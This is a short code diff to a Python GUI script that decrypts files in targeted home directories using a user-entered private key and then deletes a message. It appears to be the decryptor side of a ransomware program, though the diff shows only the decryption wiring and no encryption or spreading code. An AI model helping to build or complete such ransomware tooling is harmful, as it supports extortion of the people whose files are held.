@@ -72,7 +72,6 @@ def decrypt_directory(directory_path, private_key_pem_str):
         executor.map(lambda file: decrypt_file(file, private_key), encrypted_files)
 
 def main(private_key):
-    # Example usage
     home_dir = os.path.expanduser('~')
 
     # Directories to target
@@ -95,8 +94,7 @@ def main(private_key):
     delete_message()
 
 def decrypt_directory_with_key(private_key_str):
-    # Convert the private key string to a private key object here
-    # Use your existing decryption logic to decrypt the directory
+    # Convert the private key string to a private key object
     main(private_key_str)
 
 def decrypt():
@@ -104,7 +102,7 @@ def decrypt():
     if not private_key_str.strip():
         messagebox.showerror("Error", "Please enter the private key.")
         return
-    # decrypt_directory_with_key(private_key_str)  # Add your decryption function here
+    decrypt_directory_with_key(private_key_str)  # Add your decryption function here
     messagebox.showinfo("Success", "Decryption process is completed.")
 
 # Create the main window
